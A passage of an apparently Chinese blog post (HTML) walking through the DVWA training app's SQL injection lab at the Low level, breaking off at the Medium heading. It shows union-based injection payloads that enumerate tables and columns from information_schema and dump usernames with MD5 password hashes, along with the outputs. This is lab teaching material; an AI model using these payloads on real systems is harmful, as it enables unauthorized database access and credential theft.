+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column <span class="string">&#x27;3&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以判断数据库字段数为2</p>
+<ul>
+<li>1’ union select 1,2 #</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> union select 1,2 <span class="comment">#</span></span><br><span class="line">First name: 1</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure>
+
+<p>4.查询当前用户名和数据库</p>
+<ul>
+<li>1’ union select user(),database() #</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 查询当前用户名和数据库 1<span class="string">&#x27; union select user(),database() #</span></span><br><span class="line"><span class="string">First name: root@localhost</span></span><br><span class="line"><span class="string">Surname: dvwa</span></span><br></pre></td></tr></table></figure>
+
+<p>5.获取数据库中的表</p>
+<ul>
+<li>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 获取数据库中的表 1<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: guestbook,users</span></span><br></pre></td></tr></table></figure>
+
+<p>6.获取表中的字段名</p>
+<ul>
+<li>1’ union select 1, group_concat(column_name) from information_schema.columns where table_name=’users’#</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 获取表中的字段名 1<span class="string">&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;#</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span></span><br></pre></td></tr></table></figure>
+
+<p>7.获取字段中的数据</p>
+<ul>
+<li>1’ union select user,password from users#</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 获取字段中的数据 1&#x27;</span> union select user,password from <span class="built_in">users</span><span class="comment">#</span></span><br><span class="line">First name: gordonb</span><br><span class="line">Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: 1337</span></span><br><span class="line"><span class="string">Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 获取字段中的数据 1&#x27;</span> union select user,password from <span class="built_in">users</span><span class="comment">#</span></span><br><span class="line">First name: pablo</span><br><span class="line">Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: smithy</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Medium级"><a href="#Medium级" class="headerlink" title="Medium级"></a>Medium级</h5>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/19/MYSQL-5-7-16-install/" rel="prev" title="MYSQL_5.7.16_install">
+                  <i class="fa fa-chevron-left"></i> MYSQL_5.7.16_install
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">涩橙子</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
